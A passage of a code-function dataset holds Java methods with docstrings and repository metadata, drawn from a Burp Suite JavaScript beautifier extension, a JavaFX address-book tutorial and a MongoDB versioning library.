gbc_lblNewLabel);\n\n\t\n\tGridBagConstraints gbc_max_preserve_newlines = new GridBagConstraints();\n\tgbc_max_preserve_newlines.anchor = GridBagConstraints.WEST;\n\tgbc_max_preserve_newlines.insets = new Insets(0, 0, 5, 5);\n\tgbc_max_preserve_newlines.gridx = 2;\n\tgbc_max_preserve_newlines.gridy = 4;\n\tadd(max_preserve_newlines, gbc_max_preserve_newlines);\n\t\n\tJLabel lblKeeparrayindentation = new JLabel(\"Keep array indentation?\");\n\tGridBagConstraints gbc_lblKeeparrayindentation = new GridBagConstraints();\n\tgbc_lblKeeparrayindentation.anchor = GridBagConstraints.WEST;\n\tgbc_lblKeeparrayindentation.insets = new Insets(0, 0, 5, 5);\n\tgbc_lblKeeparrayindentation.gridx = 3;\n\tgbc_lblKeeparrayindentation.gridy = 4;\n\tadd(lblKeeparrayindentation, gbc_lblKeeparrayindentation);\n\t\n\t\n\tGridBagConstraints gbc_keep_array_indentation = new GridBagConstraints();\n\tgbc_keep_array_indentation.anchor = GridBagConstraints.WEST;\n\tgbc_keep_array_indentation.insets = new Insets(0, 0, 5, 5);\n\tgbc_keep_array_indentation.gridx = 4;\n\tgbc_keep_array_indentation.gridy = 4;\n\tadd(keep_array_indentation, gbc_keep_array_indentation);\n\t\n\tJLabel lblWraplinelength = new JLabel(\"Wrap Line Length\");\n\tGridBagConstraints gbc_lblWraplinelength = new GridBagConstraints();\n\tgbc_lblWraplinelength.anchor = GridBagConstraints.WEST;\n\tgbc_lblWraplinelength.insets = new Insets(0, 0, 5, 5);\n\tgbc_lblWraplinelength.gridx = 1;\n\tgbc_lblWraplinelength.gridy = 5;\n\tadd(lblWraplinelength, gbc_lblWraplinelength);\n\n\t\n\tGridBagConstraints gbc_wrap_line_length = new GridBagConstraints();\n\tgbc_wrap_line_length.anchor = GridBagConstraints.WEST;\n\tgbc_wrap_line_length.insets = new Insets(0, 0, 5, 5);\n\tgbc_wrap_line_length.gridx = 2;\n\tgbc_wrap_line_length.gridy = 5;\n\tadd(wrap_line_length, gbc_wrap_line_length);\n\t\n\tJLabel lblBreakchainedmethods = new JLabel(\"Break lines on chained methods?\");\n\tGridBagConstraints gbc_lblBreakchainedmethods = new GridBagConstraints();\n\tgbc_lblBreakchainedmethods.anchor = GridBagConstraints.WEST;\n\tgbc_lblBreakchainedmethods.insets = new Insets(0, 0, 5, 5);\n\tgbc_lblBreakchainedmethods.gridx = 3;\n\tgbc_lblBreakchainedmethods.gridy = 5;\n\tadd(lblBreakchainedmethods, gbc_lblBreakchainedmethods);\n\t\n\t\n\tGridBagConstraints gbc_break_chained_methods = new GridBagConstraints();\n\tgbc_break_chained_methods.anchor = GridBagConstraints.WEST;\n\tgbc_break_chained_methods.insets = new Insets(0, 0, 5, 5);\n\tgbc_break_chained_methods.gridx = 4;\n\tgbc_break_chained_methods.gridy = 5;\n\tadd(break_chained_methods, gbc_break_chained_methods);\n\t\n\tJLabel lblBracestyle = new JLabel(\"Brace Style\");\n\tGridBagConstraints gbc_lblBracestyle = new GridBagConstraints();\n\tgbc_lblBracestyle.anchor = GridBagConstraints.WEST;\n\tgbc_lblBracestyle.insets = new Insets(0, 0, 5, 5);\n\tgbc_lblBracestyle.gridx = 1;\n\tgbc_lblBracestyle.gridy = 6;\n\tadd(lblBracestyle, gbc_lblBracestyle);\n\t\n\n\n\t\n\tGridBagConstraints gbc_brace_style = new GridBagConstraints();\n\tgbc_brace_style.anchor = GridBagConstraints.WEST;\n\tgbc_brace_style.insets = new Insets(0, 0, 5, 5);\n\tgbc_brace_style.gridx = 2;\n\tgbc_brace_style.gridy = 6;\n\tadd(brace_style, gbc_brace_style);\n\t\n\tJLabel lblSpacebeforeconditional = new JLabel(\"Space before conditional: \\\"if(x)\\\" / \\\"if (x)\\\"\");\n\tGridBagConstraints gbc_lblSpacebeforeconditional = new GridBagConstraints();\n\tgbc_lblSpacebeforeconditional.anchor = GridBagConstraints.WEST;\n\tgbc_lblSpacebeforeconditional.insets = new Insets(0, 0, 5, 5);\n\tgbc_lblSpacebeforeconditional.gridx = 3;\n\tgbc_lblSpacebeforeconditional.gridy = 6;\n\tadd(lblSpacebeforeconditional, gbc_lblSpacebeforeconditional);\n\t\n\t\n\tGridBagConstraints gbc_space_before_conditional = new GridBagConstraints();\n\tgbc_space_before_conditional.anchor = GridBagConstraints.WEST;\n\tgbc_space_before_conditional.insets = new Insets(0, 0, 5, 5);\n\tgbc_space_before_conditional.gridx = 4;\n\tgbc_space_before_conditional.gridy = 6;\n\tadd(space_before_conditional, gbc_space_before_conditional);\n\t\n\tJLabel lblIndentscripts = new JLabel(\"Indent Scripts\");\n\tGridBagConstraints gbc_lblIndentscripts = new GridBagConstraints();\n\tgbc_lblIndentscripts.anchor = GridBagConstraints.WEST;\n\tgbc_lblIndentscripts.insets = new Insets(0, 0, 5, 5);\n\tgbc_lblIndentscripts.gridx = 1;\n\tgbc_lblIndentscripts.gridy = 7;\n\tadd(lblIndentscripts, gbc_lblIndentscripts);\n\n\tGridBagConstraints gbc_indent_scripts = new GridBagConstraints();\n\tgbc_indent_scripts.anchor = GridBagConstraints.WEST;\n\tgbc_indent_scripts.insets = new Insets(0, 0, 5, 5);\n\tgbc_indent_scripts.gridx = 2;\n\tgbc_indent_scripts.gridy = 7;\n\tadd(indent_scripts, gbc_indent_scripts);\n\t\n\tJLabel lblUnescapestrings = new JLabel(\"Unescape printable chars encoded as \\\\xNN or \\\\uNNNN?\");\n\tGridBagConstraints gbc_lblUnescapestrings = new GridBagConstraints();\n\tgbc_lblUnescapestrings.anchor = GridBagConstraints.WEST;\n\tgbc_lblUnescapestrings.insets = new Insets(0, 0, 5, 5);\n\tgbc_lblUnescapestrings.gridx = 3;\n\tgbc_lblUnescapestrings.gridy = 7;\n\tadd(lblUnescapestrings, gbc_lblUnescapestrings);\n\t\n\t\t\tGridBagConstraints gbc_unescape_strings = new GridBagConstraints();\n\t\t\tgbc_unescape_strings.anchor = GridBagConstraints.WEST;\n\t\t\tgbc_unescape_strings.insets = new Insets(0, 0, 5, 5);\n\t\t\tgbc_unescape_strings.gridx = 4;\n\t\t\tgbc_unescape_strings.gridy = 7;\n\t\t\tadd(unescape_strings, gbc_unescape_strings);\n\t\n\tJLabel lblNewLabel_1 = new JLabel(\"Debug Mode?\");\n\tGridBagConstraints gbc_lblNewLabel_1 = new GridBagConstraints();\n\tgbc_lblNewLabel_1.anchor = GridBagConstraints.WEST;\n\tgbc_lblNewLabel_1.insets = new Insets(0, 0, 5, 5);\n\tgbc_lblNewLabel_1.gridx = 1;\n\tgbc_lblNewLabel_1.gridy = 8;\n\tadd(lblNewLabel_1, gbc_lblNewLabel_1);\n\n\tGridBagConstraints gbc_isDebug = new GridBagConstraints();\n\tgbc_isDebug.anchor = GridBagConstraints.WEST;\n\tgbc_isDebug.insets = new Insets(0, 0, 5, 5);\n\tgbc_isDebug.gridx = 2;\n\tgbc_isDebug.gridy = 8;\n\tadd(isDebug, gbc_isDebug);\n\t\n\tJButton btnResetToOriginal = new JButton(\"Reset To Original Values\");\n\tbtnResetToOriginal.addActionListener(new ActionListener() {\n\t\tpublic void actionPerformed(ActionEvent arg0) {\n\t\t\tBeautifierPreferences.resetBeautifierPreferences();\n\t\t\tsetPreferencesValues();\n\t\t}\n\t});\n\t\n\tJLabel label_1 = new JLabel(\"     \");\n\tGridBagConstraints gbc_label_1 = new GridBagConstraints();\n\tgbc_label_1.insets = new Insets(0, 0, 5, 5);\n\tgbc_label_1.gridx = 1;\n\tgbc_label_1.gridy = 9;\n\tadd(label_1, gbc_label_1);\n\tGridBagConstraints gbc_btnResetToOriginal = new GridBagConstraints();\n\tgbc_btnResetToOriginal.anchor = GridBagConstraints.WEST;\n\tgbc_btnResetToOriginal.insets = new Insets(0, 0, 5, 5);\n\tgbc_btnResetToOriginal.gridx = 1;\n\tgbc_btnResetToOriginal.gridy = 10;\n\tadd(btnResetToOriginal, gbc_btnResetToOriginal);\n\t\n\tJButton btnCheckForUpdate = new JButton(\"Check For Update\");\n\tbtnCheckForUpdate.addActionListener(new ActionListener() {\n\t\tpublic void actionPerformed(ActionEvent arg0) {\n\t\t\tJSBeautifierCheckForUpdate checkForUpdate = new burp.JSBeautifier.JSBeautifierCheckForUpdate(mCallbacks);\n\t\t\t\tJOptionPane.showMessageDialog(null, checkForUpdate.updateMessage);\n\t\t\t\t\n\t\t}\n\t});\n\tGridBagConstraints gbc_btnCheckForUpdate = new GridBagConstraints();\n\tgbc_btnCheckForUpdate.anchor = GridBagConstraints.WEST;\n\tgbc_btnCheckForUpdate.insets = new Insets(0, 0, 5, 5);\n\tgbc_btnCheckForUpdate.gridx = 1;\n\tgbc_btnCheckForUpdate.gridy = 11;\n\tadd(btnCheckForUpdate, gbc_btnCheckForUpdate);\n\t\n\tJButton btnOpenExtensionHome = new JButton(\"Open Extension Home Page\");\n\tbtnOpenExtensionHome.addActionListener(new ActionListener() {\n\t\tpublic void actionPerformed(ActionEvent e) {\n\t\t\topenWebpage(burp.JSBeautifier.BeautifierPreferences.getProjectLink());\n\t\t}\n\t});\n\tGridBagConstraints gbc_btnOpenExtensionHome = new GridBagConstraints();\n\tgbc_btnOpenExtensionHome.anchor = GridBagConstraints.WEST;\n\tgbc_btnOpenExtensionHome.insets = new Insets(0, 0, 5, 5);\n\tgbc_btnOpenExtensionHome.gridx = 1;\n\tgbc_btnOpenExtensionHome.gridy = 12;\n\tadd(btnOpenExtensionHome, gbc_btnOpenExtensionHome);\n\t\n\tJLabel label_2 = new JLabel(\"     \");\n\tGridBagConstraints gbc_label_2 = new GridBagConstraints();\n\tgbc_label_2.insets = new Insets(0, 0, 5, 5);\n\tgbc_label_2.gridx = 1;\n\tgbc_label_2.gridy = 13;\n\tadd(label_2, gbc_label_2);\n\t\n\tJLabel appInfoLabel = new JLabel(BeautifierPreferences.getAppInfo());\n\tGridBagConstraints gbc_appInfoLabel = new GridBagConstraints();\n\tgbc_appInfoLabel.anchor = GridBagConstraints.WEST;\n\tgbc_appInfoLabel.gridwidth = 4;\n\tgbc_appInfoLabel.insets = new Insets(0, 0, 0, 5);\n\tgbc_appInfoLabel.gridx = 1;\n\tgbc_appInfoLabel.gridy = 14;\n\tadd(appInfoLabel, gbc_appInfoLabel);\n\t\n\t\n\tfillComboBoxes();\n\tsetPreferencesValues();\n\tsetComponentsActions();\n}", "path": "jsbeautifier\\src\\burp\\customGUI\\PreferencesEditor.java", "repo_name": "irsdl/BurpSuiteJSBeautifier", "stars": 88, "license": "None", "language": "java", "size": 2480}
{"docstring": "// Check to see if it is a Pipe-delimited .Net Ajax response\n", "func_signal": "private boolean isDotNetPipeDelimitedResponse(String strBody)", "code": "{\n\tboolean result = false;\n\tif(strBody.split(\"|\").length > 3 && !strBody.trim().startsWith(\"<\") && Character.isDigit(strBody.charAt(0)) ){\n\t\tresult = true; // It seems it is a DotNet delimited response /:)\n\t}\n\tif (beautifierPreferences.isDebugMode())\n\t\tstdout.println(\"isDotNetPipeDelimitedResponse: \"+ result);\n\treturn result;\n}", "path": "src\\burp\\JSBeautifier\\JSBeautifierFunctions.java", "repo_name": "irsdl/BurpSuiteJSBeautifier", "stars": 88, "license": "None", "language": "java", "size": 2480}
{"docstring": "/**\n * Skips the <code>BOM</code> that was found in the wrapped\n * <code>InputStream</code> object.\n * \n * @return this <code>UnicodeBOMInputStream</code>.\n * \n * @throws IOException when trying to skip the BOM from the wrapped\n * <code>InputStream</code> object.\n */\n", "func_signal": "public final synchronized UnicodeBOMInputStream skipBOM() throws IOException", "code": "{\n\tif (!skipped)\n\t{\n\t\tin.skip(bom.bytes.length);\n\t\tskipped = true;\n\t}\n\treturn this;\n}", "path": "src\\burp\\JSBeautifier\\UnicodeBOMInputStream.java", "repo_name": "irsdl/BurpSuiteJSBeautifier", "stars": 88, "license": "None", "language": "java", "size": 2480}
{"docstring": "/**\n * Skips the <code>BOM</code> that was found in the wrapped\n * <code>InputStream</code> object.\n * \n * @return this <code>UnicodeBOMInputStream</code>.\n * \n * @throws IOException when trying to skip the BOM from the wrapped\n * <code>InputStream</code> object.\n */\n", "func_signal": "public final synchronized UnicodeBOMInputStream skipBOM() throws IOException", "code": "{\n\tif (!skipped)\n\t{\n\t\tin.skip(bom.bytes.length);\n\t\tskipped = true;\n\t}\n\treturn this;\n}", "path": "jsbeautifier\\src\\burp\\JSBeautifier\\UnicodeBOMInputStream.java", "repo_name": "irsdl/BurpSuiteJSBeautifier", "stars": 88, "license": "None", "language": "java", "size": 2480}
{"docstring": "// Split header and body of a request or response\n", "func_signal": "private String[] getHeaderAndBody(byte[] fullMessage) throws UnsupportedEncodingException", "code": "{\n\tString[] result = {\"\",\"\"};\n\tString strFullMessage = \"\";\n\tif(fullMessage != null){\n\t\t// splitting the message to retrieve the header and the body\n\t\tstrFullMessage = new String(fullMessage,encoding);\n\t\tif(strFullMessage.contains(\"\\r\\n\\r\\n\"))\n\t\t\tresult = strFullMessage.split(\"\\r\\n\\r\\n\",2);\n\t}\n\tif (beautifierPreferences.isDebugMode())\n\t\tstdout.println(\"FullMessage Length: \"+ fullMessage.length + \"    Header length: \"+ result[0].length() + \"   Body length:\"+ result[1].length());\n\treturn result;\n}", "path": "src\\burp\\JSBeautifier\\JSBeautifierFunctions.java", "repo_name": "irsdl/BurpSuiteJSBeautifier", "stars": 88, "license": "None", "language": "java", "size": 2480}
{"docstring": "/**\n * Opens an about dialog.\n */\n", "func_signal": "@FXML\nprivate void handleAbout()", "code": "{\n\tAlert alert = new Alert(AlertType.INFORMATION);\n\talert.setTitle(\"AddressApp\");\n\talert.setHeaderText(\"About\");\n\talert.setContentText(\"Author: Marco Jakob\\nWebsite: http://code.makery.ch\");\n\n\talert.showAndWait();\n}", "path": "AddressApp-Part-5\\src\\ch\\makery\\address\\view\\RootLayoutController.java", "repo_name": "marcojakob/tutorial-javafx-8", "stars": 67, "license": "None", "language": "java", "size": 1758}
{"docstring": "/**\n * Called when the user clicks ok.\n */\n", "func_signal": "@FXML\nprivate void handleOk()", "code": "{\n    if (isInputValid()) {\n        person.setFirstName(firstNameField.getText());\n        person.setLastName(lastNameField.getText());\n        person.setStreet(streetField.getText());\n        person.setPostalCode(Integer.parseInt(postalCodeField.getText()));\n        person.setCity(cityField.getText());\n        person.setBirthday(DateUtil.parse(birthdayField.getText()));\n\n        okClicked = true;\n        dialogStage.close();\n    }\n}", "path": "AddressApp-Part-6\\src\\ch\\makery\\address\\view\\PersonEditDialogController.java", "repo_name": "marcojakob/tutorial-javafx-8", "stars": 67, "license": "None", "language": "java", "size": 1758}
{"docstring": "/**\n * Shows the person overview inside the root layout.\n */\n", "func_signal": "public void showPersonOverview()", "code": "{\n    try {\n        // Load person overview.\n        FXMLLoader loader = new FXMLLoader();\n        loader.setLocation(MainApp.class.getResource(\"view/PersonOverview.fxml\"));\n        AnchorPane personOverview = (AnchorPane) loader.load();\n\n        // Set person overview into the center of root layout.\n        rootLayout.setCenter(personOverview);\n\n        // Give the controller access to the main app.\n        PersonOverviewController controller = loader.getController();\n        controller.setMainApp(this);\n\n    } catch (IOException e) {\n        e.printStackTrace();\n    }\n}", "path": "AddressApp-Part-4\\src\\ch\\makery\\address\\MainApp.java", "repo_name": "marcojakob/tutorial-javafx-8", "stars": 67, "license": "None", "language": "java", "size": 1758}
{"docstring": "/**\n * Opens a dialog to edit details for the specified person. If the user\n * clicks OK, the changes are saved into the provided person object and true\n * is returned.\n * \n * @param person the person object to be edited\n * @return true if the user clicked OK, false otherwise.\n */\n", "func_signal": "public boolean showPersonEditDialog(Person person)", "code": "{\n    try {\n        // Load the fxml file and create a new stage for the popup dialog.\n        FXMLLoader loader = new FXMLLoader();\n        loader.setLocation(MainApp.class.getResource(\"view/PersonEditDialog.fxml\"));\n        AnchorPane page = (AnchorPane) loader.load();\n\n        // Create the dialog Stage.\n        Stage dialogStage = new Stage();\n        dialogStage.setTitle(\"Edit Person\");\n        dialogStage.initModality(Modality.WINDOW_MODAL);\n        dialogStage.initOwner(primaryStage);\n        Scene scene = new Scene(page);\n        dialogStage.setScene(scene);\n\n        // Set the person into the controller.\n        PersonEditDialogController controller = loader.getController();\n        controller.setDialogStage(dialogStage);\n        controller.setPerson(person);\n        \n        // Set the dialog icon.\n        dialogStage.getIcons().add(new Image(\"file:resources/images/edit.png\"));\n\n        // Show the dialog and wait until the user closes it\n        dialogStage.showAndWait();\n\n        return controller.isOkClicked();\n    } catch (IOException e) {\n        e.printStackTrace();\n        return false;\n    }\n}", "path": "AddressApp-Part-4\\src\\ch\\makery\\address\\MainApp.java", "repo_name": "marcojakob/tutorial-javafx-8", "stars": 67, "license": "None", "language": "java", "size": 1758}
{"docstring": "/**\n * Validates the user input in the text fields.\n * \n * @return true if the input is valid\n */\n", "func_signal": "private boolean isInputValid()", "code": "{\n    String errorMessage = \"\";\n\n    if (firstNameField.getText() == null || firstNameField.getText().length() == 0) {\n        errorMessage += \"No valid first name!\\n\"; \n    }\n    if (lastNameField.getText() == null || lastNameField.getText().length() == 0) {\n        errorMessage += \"No valid last name!\\n\"; \n    }\n    if (streetField.getText() == null || streetField.getText().length() == 0) {\n        errorMessage += \"No valid street!\\n\"; \n    }\n\n    if (postalCodeField.getText() == null || postalCodeField.getText().length() == 0) {\n        errorMessage += \"No valid postal code!\\n\"; \n    } else {\n        // try to parse the postal code into an int.\n        try {\n            Integer.parseInt(postalCodeField.getText());\n        } catch (NumberFormatException e) {\n            errorMessage += \"No valid postal code (must be an integer)!\\n\"; \n        }\n    }\n\n    if (cityField.getText() == null || cityField.getText().length() == 0) {\n        errorMessage += \"No valid city!\\n\"; \n    }\n\n    if (birthdayField.getText() == null || birthdayField.getText().length() == 0) {\n        errorMessage += \"No valid birthday!\\n\";\n    } else {\n        if (!DateUtil.validDate(birthdayField.getText())) {\n            errorMessage += \"No valid birthday. Use the format dd.mm.yyyy!\\n\";\n        }\n    }\n\n    if (errorMessage.length() == 0) {\n        return true;\n    } else {\n        // Show the error message.\n        Alert alert = new Alert(AlertType.ERROR);\n        alert.initOwner(dialogStage);\n        alert.setTitle(\"Invalid Fields\");\n        alert.setHeaderText(\"Please correct invalid fields\");\n        alert.setContentText(errorMessage);\n        \n        alert.showAndWait();\n        \n        return false;\n    }\n}", "path": "AddressApp-Part-6\\src\\ch\\makery\\address\\view\\PersonEditDialogController.java", "repo_name": "marcojakob/tutorial-javafx-8", "stars": 67, "license": "None", "language": "java", "size": 1758}
{"docstring": "/**\n * Saves the file to the person file that is currently open. If there is no\n * open file, the \"save as\" dialog is shown.\n */\n", "func_signal": "@FXML\nprivate void handleSave()", "code": "{\n    File personFile = mainApp.getPersonFilePath();\n    if (personFile != null) {\n        mainApp.savePersonDataToFile(personFile);\n    } else {\n        handleSaveAs();\n    }\n}", "path": "AddressApp-Part-5\\src\\ch\\makery\\address\\view\\RootLayoutController.java", "repo_name": "marcojakob/tutorial-javafx-8", "stars": 67, "license": "None", "language": "java", "size": 1758}
{"docstring": "/**\n * Opens a FileChooser to let the user select an address book to load.\n */\n", "func_signal": "@FXML\nprivate void handleOpen()", "code": "{\n    FileChooser fileChooser = new FileChooser();\n\n    // Set extension filter\n    FileChooser.ExtensionFilter extFilter = new FileChooser.ExtensionFilter(\n            \"XML files (*.xml)\", \"*.xml\");\n    fileChooser.getExtensionFilters().add(extFilter);\n\n    // Show save file dialog\n    File file = fileChooser.showOpenDialog(mainApp.getPrimaryStage());\n\n    if (file != null) {\n        mainApp.loadPersonDataFromFile(file);\n    }\n}", "path": "AddressApp-Part-5\\src\\ch\\makery\\address\\view\\RootLayoutController.java", "repo_name": "marcojakob/tutorial-javafx-8", "stars": 67, "license": "None", "language": "java", "size": 1758}
{"docstring": "/**\n * Called when the user clicks the new button. Opens a dialog to edit\n * details for a new person.\n */\n", "func_signal": "@FXML\nprivate void handleNewPerson()", "code": "{\n    Person tempPerson = new Person();\n    boolean okClicked = mainApp.showPersonEditDialog(tempPerson);\n    if (okClicked) {\n        mainApp.getPersonData().add(tempPerson);\n    }\n}", "path": "AddressApp-Part-3\\src\\ch\\makery\\address\\view\\PersonOverviewController.java", "repo_name": "marcojakob/tutorial-javafx-8", "stars": 67, "license": "None", "language": "java", "size": 1758}
{"docstring": "/**\n * Sets the stage of this dialog.\n * \n * @param dialogStage\n */\n", "func_signal": "public void setDialogStage(Stage dialogStage)", "code": "{\n    this.dialogStage = dialogStage;\n    \n    // Set the dialog icon.\n    this.dialogStage.getIcons().add(new Image(\"file:resources/images/edit.png\"));\n}", "path": "AddressApp-Part-6\\src\\ch\\makery\\address\\view\\PersonEditDialogController.java", "repo_name": "marcojakob/tutorial-javafx-8", "stars": 67, "license": "None", "language": "java", "size": 1758}
{"docstring": "/**\n * Initializes the root layout.\n */\n", "func_signal": "public void initRootLayout()", "code": "{\n    try {\n        // Load root layout from fxml file.\n        FXMLLoader loader = new FXMLLoader();\n        loader.setLocation(MainApp.class.getResource(\"view/RootLayout.fxml\"));\n        rootLayout = (BorderPane) loader.load();\n\n        // Show the scene containing the root layout.\n        Scene scene = new Scene(rootLayout);\n        primaryStage.setScene(scene);\n        primaryStage.show();\n    } catch (IOException e) {\n        e.printStackTrace();\n    }\n}", "path": "AddressApp-Part-4\\src\\ch\\makery\\address\\MainApp.java", "repo_name": "marcojakob/tutorial-javafx-8", "stars": 67, "license": "None", "language": "java", "size": 1758}
{"docstring": "/**\n * Creates an empty address book.\n */\n", "func_signal": "@FXML\nprivate void handleNew()", "code": "{\n    mainApp.getPersonData().clear();\n    mainApp.setPersonFilePath(null);\n}", "path": "AddressApp-Part-5\\src\\ch\\makery\\address\\view\\RootLayoutController.java", "repo_name": "marcojakob/tutorial-javafx-8", "stars": 67, "license": "None", "language": "java", "size": 1758}
{"docstring": "/**\n * Constructor with some initial data.\n * \n * @param firstName\n * @param lastName\n */\n", "func_signal": "public Person(String firstName, String lastName)", "code": "{\n    this.firstName = new SimpleStringProperty(firstName);\n    this.lastName = new SimpleStringProperty(lastName);\n\n    // Some initial dummy data, just for convenient testing.\n    this.street = new SimpleStringProperty(\"some street\");\n    this.postalCode = new SimpleIntegerProperty(1234);\n    this.city = new SimpleStringProperty(\"some city\");\n    this.birthday = new SimpleObjectProperty<LocalDate>(LocalDate.of(1999, 2, 21));\n}", "path": "AddressApp-Part-3\\src\\ch\\makery\\address\\model\\Person.java", "repo_name": "marcojakob/tutorial-javafx-8", "stars": 67, "license": "None", "language": "java", "size": 1758}
{"docstring": "/**\n * Opens a FileChooser to let the user select a file to save to.\n */\n", "func_signal": "@FXML\nprivate void handleSaveAs()", "code": "{\n    FileChooser fileChooser = new FileChooser();\n\n    // Set extension filter\n    FileChooser.ExtensionFilter extFilter = new FileChooser.ExtensionFilter(\n            \"XML files (*.xml)\", \"*.xml\");\n    fileChooser.getExtensionFilters().add(extFilter);\n\n    // Show save file dialog\n    File file = fileChooser.showSaveDialog(mainApp.getPrimaryStage());\n\n    if (file != null) {\n        // Make sure it has the correct extension\n        if (!file.getPath().endsWith(\".xml\")) {\n            file = new File(file.getPath() + \".xml\");\n        }\n        mainApp.savePersonDataToFile(file);\n    }\n}", "path": "AddressApp-Part-5\\src\\ch\\makery\\address\\view\\RootLayoutController.java", "repo_name": "marcojakob/tutorial-javafx-8", "stars": 67, "license": "None", "language": "java", "size": 1758}
{"docstring": "/**\n * Initializes the controller class. This method is automatically called\n * after the fxml file has been loaded.\n */\n", "func_signal": "@FXML\nprivate void initialize()", "code": "{\n    // Initialize the person table with the two columns.\n    firstNameColumn.setCellValueFactory(cellData -> cellData.getValue().firstNameProperty());\n    lastNameColumn.setCellValueFactory(cellData -> cellData.getValue().lastNameProperty());\n    \n    // Clear person details.\n    showPersonDetails(null);\n\n    // Listen for selection changes and show the person details when changed.\n    personTable.getSelectionModel().selectedItemProperty().addListener(\n            (observable, oldValue, newValue) -> showPersonDetails(newValue));\n}", "path": "AddressApp-Part-3\\src\\ch\\makery\\address\\view\\PersonOverviewController.java", "repo_name": "marcojakob/tutorial-javafx-8", "stars": 67, "license": "None", "language": "java", "size": 1758}
{"docstring": "/**\n * Is called by the main application to give a reference back to itself.\n * \n * @param mainApp\n */\n", "func_signal": "public void setMainApp(MainApp mainApp)", "code": "{\n    this.mainApp = mainApp;\n\n    // Add observable list data to the table\n    personTable.setItems(mainApp.getPersonData());\n}", "path": "AddressApp-Part-3\\src\\ch\\makery\\address\\view\\PersonOverviewController.java", "repo_name": "marcojakob/tutorial-javafx-8", "stars": 67, "license": "None", "language": "java", "size": 1758}
{"docstring": "/**\n * Called when the user clicks the edit button. Opens a dialog to edit\n * details for the selected person.\n */\n", "func_signal": "@FXML\nprivate void handleEditPerson()", "code": "{\n    Person selectedPerson = personTable.getSelectionModel().getSelectedItem();\n    if (selectedPerson != null) {\n        boolean okClicked = mainApp.showPersonEditDialog(selectedPerson);\n        if (okClicked) {\n            showPersonDetails(selectedPerson);\n        }\n\n    } else {\n        // Nothing selected.\n        Alert alert = new Alert(AlertType.WARNING);\n        alert.initOwner(mainApp.getPrimaryStage());\n        alert.setTitle(\"No Selection\");\n        alert.setHeaderText(\"No Person Selected\");\n        alert.setContentText(\"Please select a person in the table.\");\n        \n        alert.showAndWait();\n    }\n}", "path": "AddressApp-Part-3\\src\\ch\\makery\\address\\view\\PersonOverviewController.java", "repo_name": "marcojakob/tutorial-javafx-8", "stars": 67, "license": "None", "language": "java", "size": 1758}
{"docstring": "/**\n * Fills all text fields to show details about the person.\n * If the specified person is null, all text fields are cleared.\n * \n * @param person the person or null\n */\n", "func_signal": "private void showPersonDetails(Person person)", "code": "{\n    if (person != null) {\n        // Fill the labels with info from the person object.\n        firstNameLabel.setText(person.getFirstName());\n        lastNameLabel.setText(person.getLastName());\n        streetLabel.setText(person.getStreet());\n        postalCodeLabel.setText(Integer.toString(person.getPostalCode()));\n        cityLabel.setText(person.getCity());\n        birthdayLabel.setText(DateUtil.format(person.getBirthday()));\n    } else {\n        // Person is null, remove all the text.\n        firstNameLabel.setText(\"\");\n        lastNameLabel.setText(\"\");\n        streetLabel.setText(\"\");\n        postalCodeLabel.setText(\"\");\n        cityLabel.setText(\"\");\n        birthdayLabel.setText(\"\");\n    }\n}", "path": "AddressApp-Part-3\\src\\ch\\makery\\address\\view\\PersonOverviewController.java", "repo_name": "marcojakob/tutorial-javafx-8", "stars": 67, "license": "None", "language": "java", "size": 1758}
{"docstring": "/**\n * Called when the user clicks on the delete button.\n */\n", "func_signal": "@FXML\nprivate void handleDeletePerson()", "code": "{\n    int selectedIndex = personTable.getSelectionModel().getSelectedIndex();\n    if (selectedIndex >= 0) {\n        personTable.getItems().remove(selectedIndex);\n    } else {\n        // Nothing selected.\n        Alert alert = new Alert(AlertType.WARNING);\n        alert.initOwner(mainApp.getPrimaryStage());\n        alert.setTitle(\"No Selection\");\n        alert.setHeaderText(\"No Person Selected\");\n        alert.setContentText(\"Please select a person in the table.\");\n        \n        alert.showAndWait();\n    }\n}", "path": "AddressApp-Part-3\\src\\ch\\makery\\address\\view\\PersonOverviewController.java", "repo_name": "marcojakob/tutorial-javafx-8", "stars": 67, "license": "None", "language": "java", "size": 1758}
{"docstring": "/**\n * Sets the person to be edited in the dialog.\n * \n * @param person\n */\n", "func_signal": "public void setPerson(Person person)", "code": "{\n    this.person = person;\n\n    firstNameField.setText(person.getFirstName());\n    lastNameField.setText(person.getLastName());\n    streetField.setText(person.getStreet());\n    postalCodeField.setText(Integer.toString(person.getPostalCode()));\n    cityField.setText(person.getCity());\n    birthdayField.setText(DateUtil.format(person.getBirthday()));\n    birthdayField.setPromptText(\"dd.mm.yyyy\");\n}", "path": "AddressApp-Part-6\\src\\ch\\makery\\address\\view\\PersonEditDialogController.java", "repo_name": "marcojakob/tutorial-javafx-8", "stars": 67, "license": "None", "language": "java", "size": 1758}
{"docstring": "/**\n * Constructor\n */\n", "func_signal": "public MainApp()", "code": "{\n    // Add some sample data\n    personData.add(new Person(\"Hans\", \"Muster\"));\n    personData.add(new Person(\"Ruth\", \"Mueller\"));\n    personData.add(new Person(\"Heinz\", \"Kurz\"));\n    personData.add(new Person(\"Cornelia\", \"Meier\"));\n    personData.add(new Person(\"Werner\", \"Meyer\"));\n    personData.add(new Person(\"Lydia\", \"Kunz\"));\n    personData.add(new Person(\"Anna\", \"Best\"));\n    personData.add(new Person(\"Stefan\", \"Meier\"));\n    personData.add(new Person(\"Martin\", \"Mueller\"));\n}", "path": "AddressApp-Part-4\\src\\ch\\makery\\address\\MainApp.java", "repo_name": "marcojakob/tutorial-javafx-8", "stars": 67, "license": "None", "language": "java", "size": 1758}
{"docstring": "/**\n * Adds a named branch. Always waits for the database to fsync before\n * returning. This guarantees all threads will see the change.\n * @param name the branch's name\n * @param headCID the CID of the head commit the branch points to\n * @throws VException if there already is a branch with the given name or\n * if the given head CID could not be resolved to an existing commit\n */\n", "func_signal": "public void addBranch(String name, long headCID)", "code": "{\n\t//synchronize here, because we first check for branch existence\n\t//and then we write\n\tsynchronized(this) {\n\t\t//check prerequisites\n\t\tif (_branches.findOne(name) != null) {\n\t\t\tthrow new VException(\"A branch with the name \" + name + \" already exists\");\n\t\t}\n\t\tresolveCommit(headCID);\n\t\t\n\t\t//create branch\n\t\tDBObject o = new BasicDBObject();\n\t\to.put(MongoDBConstants.ID, name);\n\t\to.put(MongoDBConstants.CID, headCID);\n\t\to.put(ROOT_CID, headCID);\n\t\t_branches.insert(o, WriteConcern.FSYNC_SAFE);\n\t}\n}", "path": "src\\main\\java\\de\\fhg\\igd\\mongomvcc\\impl\\internal\\Tree.java", "repo_name": "igd-geo/mongomvcc", "stars": 92, "license": "lgpl-3.0", "language": "java", "size": 732}
